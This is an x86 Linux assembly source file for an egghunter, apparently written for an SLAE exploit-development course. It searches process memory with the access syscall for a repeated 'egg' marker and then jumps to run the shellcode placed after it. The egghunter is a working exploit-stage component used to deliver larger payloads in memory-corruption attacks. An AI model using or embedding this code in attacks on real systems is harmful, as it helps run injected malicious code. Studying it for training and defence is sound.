; Filename: SLAEegghunter.nasm
; Author:  Billy (@_hAxel)
; Website:  https://www.haxel.io
;
;Student ID: PA-7462
;
;
; Purpose: Search memory for a speficied "egg" and begins executing found shellcode.

global _start			

section .text
_start:
	xor ecx, ecx		        ; Clean up ECX
  xor eax, eax            ; Clean up EAX
next_page:
	or dx, 0xfff		        ; Adjust PAGE_SIZE
next_addr:
	inc edx			            ; Incrememnt address
	lea ebx, [edx+0x4]
	mov al, 0x21		        ; access syscall
	int 0x80		            ; syscall
	cmp al, 0xf2		        ; Check access result for EFAULT
	jz next_page		        ; Move to next address if EFAULT received (invalid location)
	mov eax, 0x58505850     ; Move egg to EAX, looking for 50585058 (Push EAX Pop EAX Push EAX Pop EAX)
	mov edi, edx		        ; Move current address to EDI for comparison
	scasd			              ; Scan String, compare EDI to EAX and increment EDI, Checking for egg
	jnz next_addr		        ; No match, move to next address
	scasd			              ; If first scasd matched, check next address for match, if match, we found out shellcode
	jnz next_addr		        ; Second address didn't match, move to next address and start over
	jmp edi			            ; Egg has been found, jump to that address and begin executing shellcode
